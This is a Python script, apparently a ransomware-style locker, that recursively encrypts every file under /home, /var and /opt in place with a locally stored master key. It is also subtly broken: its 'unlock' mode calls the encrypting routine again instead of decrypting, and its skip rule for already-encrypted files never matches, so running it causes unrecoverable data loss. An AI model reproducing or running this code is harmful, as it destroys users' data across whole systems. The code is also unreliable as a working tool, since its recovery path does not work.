#!/usr/bin/env python3
import os
import sys
import hashlib
import json
import time
import signal
import logging
from pathlib import Path
from datetime import datetime

from Crypto.Cipher import AES, ChaCha20_Poly1305
from Crypto.Hash import HMAC, SHA256
from Crypto.Protocol.KDF import scrypt
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad

CONFIG = {
    'keystore': '/etc/.cryptokeys',
    'logfile': '/var/log/autocrypt.log',
    'exclude': ['/proc/', '/sys/', '/dev/', '/run/', '/boot/', '/etc/.cryptokeys'],
    'extensions': ['.enc'],
    'algo': 'AES-256-GCM',
    'scrypt_params': {'N': 2**20, 'r': 8, 'p': 1}
}

logging.basicConfig(
    filename=CONFIG['logfile'],
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

class CryptoEngine:
    def __init__(self):
        self.master_key = self._init_keystore()
        self.key_cache = {}

    def _init_keystore(self):
        try:
            with open(CONFIG['keystore'], 'rb') as f:
                return f.read(32)
        except FileNotFoundError:
            key = get_random_bytes(32)
            with open(CONFIG['keystore'], 'wb') as f:
                f.write(key)
            os.chmod(CONFIG['keystore'], 0o600)
            return key

    def _derive_key(self, path):
        if path in self.key_cache:
            return self.key_cache[path]
        path_hash = hashlib.sha256(path.encode()).digest()
        hmac_obj = HMAC.new(self.master_key, digestmod=SHA256)
        hmac_obj.update(path_hash)
        key = hmac_obj.digest()
        self.key_cache[path] = key
        return key

    def encrypt_file(self, path):
        try:
            with open(path, 'rb') as f:
                data = f.read()

            key = self._derive_key(path)
            nonce = get_random_bytes(12)

            if CONFIG['algo'] == 'AES-256-GCM':
                cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
                ciphertext, tag = cipher.encrypt_and_digest(data)
            else:
                cipher = ChaCha20_Poly1305.new(key=key, nonce=nonce)
                ciphertext, tag = cipher.encrypt_and_digest(data)

            with open(path + '.enc', 'wb') as f:
                f.write(nonce)
                f.write(tag)
                f.write(ciphertext)

            os.remove(path)
            os.rename(path + '.enc', path)
            logging.info(f'Encrypted {path}')

        except Exception as e:
            logging.error(f'Failed {path}: {str(e)}')

    def decrypt_file(self, path):
        try:
            with open(path, 'rb') as f:
                nonce = f.read(12)
                tag = f.read(16)
                ciphertext = f.read()

            key = self._derive_key(path)

            if CONFIG['algo'] == 'AES-256-GCM':
                cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
                data = cipher.decrypt_and_verify(ciphertext, tag)
            else:
                cipher = ChaCha20_Poly1305.new(key=key, nonce=nonce)
                data = cipher.decrypt_and_verify(ciphertext, tag)

            with open(path + '.dec', 'wb') as f:
                f.write(data)

            os.remove(path)
            os.rename(path + '.dec', path)
            logging.info(f'Decrypted {path}')

        except Exception as e:
            logging.error(f'Failed {path}: {str(e)}')

def should_encrypt(path):
    path = str(path)
    if any(path.startswith(ex) for ex in CONFIG['exclude']):
        return False
    if any(path.endswith(ex) for ex in CONFIG['extensions']):
        return False
    return os.path.isfile(path)

def process_filesystem(root):
    crypto = CryptoEngine()
    for dirpath, _, filenames in os.walk(root):
        for f in filenames:
            path = os.path.join(dirpath, f)
            if should_encrypt(path):
                crypto.encrypt_file(path)

def lock_system():
    roots = ['/home', '/var', '/opt']
    for root in roots:
        if os.path.exists(root):
            process_filesystem(root)

def unlock_system():
    roots = ['/home', '/var', '/opt']
    for root in roots:
        if os.path.exists(root):
            process_filesystem(root)

if __name__ == '__main__':
    if len(sys.argv) > 1 and sys.argv[1] == '--unlock':
        unlock_system()
    else:
        lock_system()
